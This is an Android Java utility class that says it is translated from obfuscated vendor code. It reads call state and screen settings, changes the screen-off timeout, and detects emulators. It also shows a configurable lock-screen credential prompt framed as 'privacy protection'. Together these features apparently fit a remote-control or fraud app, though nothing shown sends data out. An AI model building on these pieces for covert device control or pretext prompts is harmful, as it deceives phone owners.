package com.guard.wallet.utils;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.CallStateVO;

/**
 * 设备信息工具类 — 亮度、超时、通话状态、休眠等。
 * 从 vendor g.java 的 T0/O0/P0/x1/g/c0/Q0/v0 方法逐行翻译。
 */
public final class DeviceInfoUtils {
    private static final String TAG = "ApplicationUtil";

    private DeviceInfoUtils() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    /** g.T0(int) — 以 200ms 为单位的休眠 (vendor 被引用 145 次) */
    public static void sleepInIntervals(int ticks) {
        int count = Math.max(ticks, 1);
        try {
            for (int i = 0; i < count; i++) {
                if (!Thread.currentThread().isAlive() || Thread.currentThread().isInterrupted()) return;
                Thread.sleep(200L);
            }
        } catch (Exception e) {
            Log.e(TAG, "sleep interrupted", e);
        }
    }

    /** g.O0() — 获取屏幕亮度 */
    public static int getScreenBrightness() {
        try {
            Context context = ctx();
            if (context != null) {
                return Settings.System.getInt(context.getContentResolver(), "screen_brightness");
            }
        } catch (Exception e) {
            Log.e(TAG, "getScreenBrightness error", e);
        }
        return -1;
    }

    /** g.P0() — 获取屏幕超时时间(ms)，返回 null 表示获取失败 */
    public static Long getScreenOffTimeout() {
        Context context = ctx();
        if (context == null) return null;
        try {
            long timeout = Settings.System.getLong(context.getContentResolver(), "screen_off_timeout");
            return timeout > 0L ? timeout : null;
        } catch (Exception e) {
            Log.e(TAG, "getScreenOffTimeout error", e);
            return null;
        }
    }

    /** g.x1(Long) — 设置屏幕超时时间，需要 WRITE_SETTINGS 或 WRITE_SECURE_SETTINGS 权限 */
    public static boolean setScreenOffTimeout(Long timeout) {
        if (timeout == null || timeout <= 0L) return false;
        try {
            Context context = ctx();
            if (context == null) return false;
            if (!Settings.System.canWrite(context) && !PermissionUtils.hasWriteSecureSettings()) {
                return false;
            }
            Log.d(TAG, "已有系统设置修改权限");
            Settings.System.putLong(context.getContentResolver(), "screen_off_timeout", timeout);
            Long current = getScreenOffTimeout();
            if (timeout.equals(current)) {
                Log.d(TAG, "已有系统设置修改权限,修改屏幕休眠时间成功");
                return true;
            }
        } catch (Exception e) {
            Log.e(TAG, "setScreenOffTimeout error", e);
        }
        return false;
    }

    /** g.g() — 获取通话状态 */
    @SuppressWarnings("deprecation")
    public static CallStateVO getCallState() {
        CallStateVO vo = new CallStateVO(-1, "CALL_STATE_UNKNOWN", "通话状态未知");
        Context context = ctx();
        if (context == null) return vo;

        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) return vo;

        int state = tm.getCallState();
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE:
                vo.setState(0);
                vo.setCallState("CALL_STATE_IDLE");
                vo.setDescription("电话空闲中...");
                break;
            case TelephonyManager.CALL_STATE_RINGING:
                vo.setState(1);
                vo.setCallState("CALL_STATE_RINGING");
                vo.setDescription("电话响铃中...");
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                vo.setState(2);
                vo.setCallState("CALL_STATE_OFFHOOK");
                vo.setDescription("电话接通中...");
                break;
            default:
                return vo;
        }
        Log.d(TAG, vo.getDescription());
        return vo;
    }

    /** g.c0(Context) — 获取本地地址（模拟器返回 10.0.2.2，真机返回 127.0.0.1）*/
    public static String getLocalhostAddress(Context context) {
        boolean isEmulator = Build.PRODUCT.contains("sdk")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Settings.Secure.getString(context.getContentResolver(), "android_id") == null;
        return isEmulator ? "10.0.2.2" : "127.0.0.1";
    }

    /** g.Q0() — 启动设备凭证确认（隐私保护验证弹窗） */
    public static boolean launchCredentialConfirm() {
        String title = "Verify personal identity";
        String subtitle = "Privacy protection";
        String desc = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";

        if (MainApplication.getInstance() != null && MainApplication.getInstance().getBuildConfig() != null) {
            com.guard.wallet.entity.BuildConfig cfg = MainApplication.getInstance().getBuildConfig();
            if (cfg.getAppCredentialTitle() != null && !cfg.getAppCredentialTitle().isEmpty()) {
                title = cfg.getAppCredentialTitle();
            }
            if (cfg.getAppCredentialSubTitle() != null && !cfg.getAppCredentialSubTitle().isEmpty()) {
                subtitle = cfg.getAppCredentialSubTitle();
            }
            if (cfg.getAppCredentialDescription() != null && !cfg.getAppCredentialDescription().isEmpty()) {
                desc = cfg.getAppCredentialDescription();
            }
        }

        return ScreenUnlockUtils.launchConfirmDeviceActivity(title, subtitle, desc, "PREPARE_FOR_APP_CONFIRM_LOCK");
    }

    /** g.v0(String, String, String) — 构建三段式标识字符串 */
    public static String buildIdentifier(String a, String b, String c) {
        return a + "/" + b + "/" + c;
    }
}
